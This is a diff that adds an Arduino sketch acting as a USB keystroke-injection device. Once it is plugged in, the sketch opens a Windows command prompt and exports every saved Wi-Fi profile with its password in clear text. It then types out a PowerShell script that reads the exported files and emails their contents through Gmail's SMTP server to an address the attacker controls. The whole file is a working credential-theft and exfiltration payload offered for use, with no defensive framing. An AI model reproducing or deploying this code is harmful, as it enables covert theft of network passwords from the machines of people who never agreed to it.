@@ -1,0 +1,86 @@
+#include "Keyboard.h"
+
+void typeKey(int key)
+{
+  Keyboard.press(key);
+  delay(50);
+  Keyboard.release(key);
+}
+
+/* Init function */
+void setup()
+{
+  // Begining the Keyboard stream
+  Keyboard.begin();
+
+  // Wait 500ms
+  delay(500);
+
+  delay(3000);
+
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  Keyboard.releaseAll();
+
+  delay(500);
+
+  Keyboard.print("cmd");
+
+  delay(500);
+
+  typeKey(KEY_RETURN);
+
+  delay(750);
+
+  Keyboard.println("cd C:/");
+  delay(100);
+  Keyboard.println("md 1234");
+  delay(100);
+  Keyboard.println("cd 1234 && netsh wlan export profile key=clear >nul");// wlan passwords in this folder
+  delay(100);
+  //Keyboard.println("exit");
+  delay(10);
+  Keyboard.println("powershell");
+  delay(1000);
+  Keyboard.println("$emailSmtpServer = 'smtp.gmail.com';");
+  delay(20);
+  Keyboard.println("$emailSmtpServerPort = '587'");
+  delay(20);
+  Keyboard.println("$emailSmtpUser = 'fromEmail';");
+  delay(20);
+  Keyboard.println("$emailSmtpPass = 'fromEmailPass';");
+  delay(50);
+  Keyboard.println("$emailMessage = New-Object System.Net.Mail.MailMessage;");
+  delay(50);
+  Keyboard.println("$emailMessage.From = 'fromEmail';");
+  delay(50);
+  Keyboard.println("$emailMessage.To.Add('toEmail);");
+  delay(50);
+  //Keyboard.println("$files=Get-ChildItem 'C:\1234\';");
+  Keyboard.println("$a = cat *;");
+  delay(50);
+  Keyboard.println("$emailMessage.Body = $a;");
+  delay(50);
+  Keyboard.println("$SMTPClient = New-Object System.Net.Mail.SmtpClient( $emailSmtpServer , $emailSmtpServerPort );");
+  delay(50);
+  Keyboard.println("$SMTPClient.EnableSsl = $true;");
+  delay(50);
+  Keyboard.println("$SMTPClient.Credentials = New-Object System.Net.NetworkCredential( $emailSmtpUser , $emailSmtpPass );");
+  delay(50);
+  Keyboard.println("write-host 'Mail Sent Successfully';");
+  delay(50);
+  Keyboard.println("$SMTPClient.Send($emailMessage);");
+  
+  delay(200);
+  Keyboard.println("exit");
+  delay(200);
+  //Keyboard.println("exit");
+  //delay(200);
+  //Keyboard.println("exit");
+  typeKey(KEY_RETURN);
+  // Ending stream
+  Keyboard.end();
+}
+
+/* Unused endless loop */
+void loop() {}
